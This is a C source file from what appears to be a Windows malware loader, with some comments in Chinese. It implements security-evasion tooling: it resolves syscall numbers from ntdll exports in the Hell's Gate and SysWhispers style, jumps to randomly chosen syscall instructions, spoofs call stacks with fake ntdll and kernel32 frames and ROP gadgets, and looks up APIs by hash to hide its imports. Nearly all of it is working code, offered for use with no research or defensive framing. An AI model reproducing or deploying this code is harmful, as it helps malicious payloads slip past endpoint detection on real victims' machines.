#include "myloader.h"

#ifndef ARRAYSIZE
#define ARRAYSIZE(x) (sizeof(x) / sizeof((x)[0]))
#endif

static void InitSpoofConfig(SPOOFER* spoof, PVOID target, UINT64 argCount) {
    if (!spoof) return;
    memset(spoof, 0, sizeof(*spoof));

    spoof->SpoofFunctionPointer = target;
    spoof->Nargs = argCount;
    spoof->ReturnAddress = (PVOID)g_returnAddress;

    spoof->FirstFrameFunctionPointer = frame_Root_Ntdll;
    spoof->SecondFrameFunctionPointer = frame_Mid_Kernel;
    spoof->FirstFrameSize = g_FirstFrameSize;
    spoof->SecondFrameSize = g_SecondFrameSize;
    spoof->StackOffsetWhereRbpIsPushed = (DWORD64)g_RbpPushOffset;
    spoof->FirstFrameRandomOffset = (DWORD64)g_FirstFrameOffset;
    spoof->SecondFrameRandomOffset = (DWORD64)g_SecondFrameOffset;

    spoof->JmpRbxGadget = g_pThunkGadget ? g_pThunkGadget : g_pRandomSyscallGadget;
    spoof->AddRspXGadget = g_pStackGadget ? g_pStackGadget : g_pRandomSyscallGadget;
    spoof->JmpRbxGadgetFrameSize = g_JmpRbxGadgetFrameSize;

    if (spoof->AddRspXGadget == g_pStackGadget) {
        spoof->AddRspXGadgetFrameSize = g_StackGadgetSize;
    } else {
        spoof->AddRspXGadgetFrameSize = 0;
    }
}

static void FillSpoofArgs(SPOOFER* spoof, UINT64 argCount, va_list args) {
    if (!spoof || !argCount) return;

    PVOID* slots[] = {
        &spoof->Arg01, &spoof->Arg02, &spoof->Arg03, &spoof->Arg04,
        &spoof->Arg05, &spoof->Arg06, &spoof->Arg07, &spoof->Arg08,
        &spoof->Arg09, &spoof->Arg10, &spoof->Arg11, &spoof->Arg12
    };

    UINT64 count = argCount;
    if (count > ARRAYSIZE(slots)) {
        count = ARRAYSIZE(slots);
    }

    for (UINT64 idx = 0; idx < count; idx++) {
        *slots[idx] = (PVOID)va_arg(args, ULONG_PTR);
    }
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	if (!g_SyscallList.Count) SW3_PopulateSyscallList(pModuleBase);

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;
			DWORD syscallId = SW3_GetSyscallNumber((DWORD)pVxTableEntry->dwHash);
			if (syscallId != (DWORD)-1)
				pVxTableEntry->wSystemCall = (WORD)syscallId;

			pVxTableEntry->pSyscallInst = SW3_GetRandomSyscallAddress((DWORD)pVxTableEntry->dwHash);
			if (!pVxTableEntry->pSyscallInst)
				pVxTableEntry->pSyscallInst = GetSyscallGadget(pModuleBase);

			if (!pVxTableEntry->wSystemCall) {
				WORD cw = 0;
				while (cw < 32) {
					if (*((PBYTE)pFunctionAddress + cw) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {

						BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
						BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
						pVxTableEntry->wSystemCall = (high << 8) | low;
						break;
					}
					cw++;
				}
				
			}
			if (!pVxTableEntry->wSystemCall) {
                //WARN("Failed to extract Syscall ID for hash: 0x%llX", pVxTableEntry->dwHash);
                return FALSE; 
            }
			pVxTableEntry->pGadget_Clean = g_pStackGadget;
			pVxTableEntry->pGadget_Thunk = g_pThunkGadget;
			return TRUE;
		}
	}
	return FALSE;
}

NTSTATUS InvokeSpoofedSyscall(PVX_TABLE_ENTRY pEntry, UINT64 argCount, ...) {
    if (!pEntry || !pEntry->pSyscallInst) return STATUS_INVALID_PARAMETER;

    Gate(pEntry->wSystemCall, pEntry->pSyscallInst, pEntry->pGadget_Clean, pEntry->pGadget_Thunk);

    SPOOFER spoof = { 0 };
    InitSpoofConfig(&spoof, SyscallWrapper, argCount);

    va_list args;
    va_start(args, argCount);
    FillSpoofArgs(&spoof, argCount, args);
    va_end(args);

    NTSTATUS status = (NTSTATUS)(ULONG_PTR)SpoofCall(&spoof);
    return status;
}
ULONG_PTR InvokeSpoofedApi(DWORD64 apiHash, UINT64 argCount, ...) {
    if (!apiHash) return 0;

    PVOID apiAddr = NULL;
    if (g_kernelBaseAddr) {
        apiAddr = GetProcAddressByName(g_kernelBaseAddr, apiHash);
    }
    if (!apiAddr && g_kernel32Base) {
        apiAddr = GetProcAddressByName(g_kernel32Base, apiHash);
    }
    if (!apiAddr && g_ntdllBase) {
        apiAddr = GetProcAddressByName(g_ntdllBase, apiHash);
    }
    if (!apiAddr) return 0;

    SPOOFER spoof = { 0 };
    InitSpoofConfig(&spoof, apiAddr, argCount);

    va_list args;
    va_start(args, argCount);
    FillSpoofArgs(&spoof, argCount, args);
    va_end(args);

    return (ULONG_PTR)SpoofCall(&spoof);
}
DWORD SW3_HashSyscall(PCSTR FunctionName) {
    return djb2((PBYTE)FunctionName);
}

PVOID SC_Address(PVOID NtApiAddress) {
	DWORD searchLimit = 512;
	PVOID SyscallAddress;
	// 64bit only here
	BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
	ULONG distance_to_syscall = 0x12;

	SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
	if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		return SyscallAddress;

	for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++) {
		SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall + num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
			return SyscallAddress;

		SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall - num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
			return SyscallAddress;
	}
	return NULL;
}

BOOL SW3_PopulateSyscallList(PVOID ntdllBase) {
    if (g_SyscallList.Count) return TRUE;
    if (!ntdllBase) return FALSE;

    // 1. 获取头部信息并计算模块范围 (用于防越界)
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + DosHeader->e_lfanew);
    DWORD ImageSize = NtHeaders->OptionalHeader.SizeOfImage;
    PIMAGE_DATA_DIRECTORY DataDirectory = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    DWORD VirtualAddress = DataDirectory->VirtualAddress;
    if (!VirtualAddress) return FALSE;

    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + VirtualAddress);
    
    // 2. 验证导出表指针是否合法
    if (!IS_ADDR_SAFE(ExportDirectory, ntdllBase, ImageSize)) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    DWORD NumberOfFunctions = ExportDirectory->NumberOfFunctions; // 用于校验 Ordinal

    if (NumberOfNames == 0 || NumberOfNames > 0xFFFF) return FALSE; 

    PDWORD Functions = SW3_RVA2VA(PDWORD, ntdllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW3_RVA2VA(PDWORD, ntdllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW3_RVA2VA(PWORD, ntdllBase, ExportDirectory->AddressOfNameOrdinals);

    // 验证表指针是否合法
    if (!IS_ADDR_SAFE(Functions, ntdllBase, ImageSize) || 
        !IS_ADDR_SAFE(Names, ntdllBase, ImageSize) || 
        !IS_ADDR_SAFE(Ordinals, ntdllBase, ImageSize)) {
        return FALSE;
    }

    DWORD i = 0;
    PSW3_SYSCALL_ENTRY Entries = g_SyscallList.Entries;
    for (DWORD j = 0; j < NumberOfNames; j++) {
        __try {
            if (!IS_ADDR_SAFE(&Names[j], ntdllBase, ImageSize)) continue;

            PCHAR FunctionName = SW3_RVA2VA(PCHAR, ntdllBase, Names[j]);
            if (!IS_ADDR_SAFE(FunctionName, ntdllBase, ImageSize)) continue;
            if (*(USHORT*)FunctionName == 0x775a) {
                WORD funcIndex = Ordinals[j];
                if (funcIndex >= NumberOfFunctions) continue;
                DWORD funcRVA = Functions[funcIndex];
                PVOID funcAddr = SW3_RVA2VA(PVOID, ntdllBase, funcRVA);
                if (!IS_ADDR_SAFE(funcAddr, ntdllBase, ImageSize)) continue;

                Entries[i].Hash = SW3_HashSyscall(FunctionName);
                Entries[i].Address = funcRVA;
                Entries[i].SyscallAddress = SC_Address(funcAddr);
                i++;
                if (i == SW3_MAX_ENTRIES) break;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
             continue;
        }
    }

    g_SyscallList.Count = i;

    // 4. 排序 (仅当数量 > 1)
    if (g_SyscallList.Count > 1) {
        for (DWORD x = 0; x < g_SyscallList.Count - 1; x++) {
            for (DWORD y = 0; y < g_SyscallList.Count - x - 1; y++) {
                if (Entries[y].Address > Entries[y + 1].Address) {
                    SW3_SYSCALL_ENTRY TempEntry = Entries[y];
                    Entries[y] = Entries[y + 1];
                    Entries[y + 1] = TempEntry;
                }
            }
        }
    }

    return TRUE;
}

DWORD SW3_GetSyscallNumber(DWORD FunctionHash) {
	if (!g_SyscallList.Count) return (DWORD)-1;
	for (DWORD i = 0; i < g_SyscallList.Count; i++) {
		if (FunctionHash == g_SyscallList.Entries[i].Hash)
			return i;
	}
	return (DWORD)-1;
}

PVOID SW3_GetSyscallAddress(DWORD FunctionHash) {
	if (!g_SyscallList.Count) return NULL;
	for (DWORD i = 0; i < g_SyscallList.Count; i++) {
		if (FunctionHash == g_SyscallList.Entries[i].Hash)
			return g_SyscallList.Entries[i].SyscallAddress;
	}
	return NULL;
}

PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash) {
	if (!g_SyscallList.Count) return NULL;
	DWORD index = ((DWORD)rand()) % g_SyscallList.Count;
	while (FunctionHash == g_SyscallList.Entries[index].Hash) {
		index = ((DWORD)rand()) % g_SyscallList.Count;
	}
	return g_SyscallList.Entries[index].SyscallAddress;
}


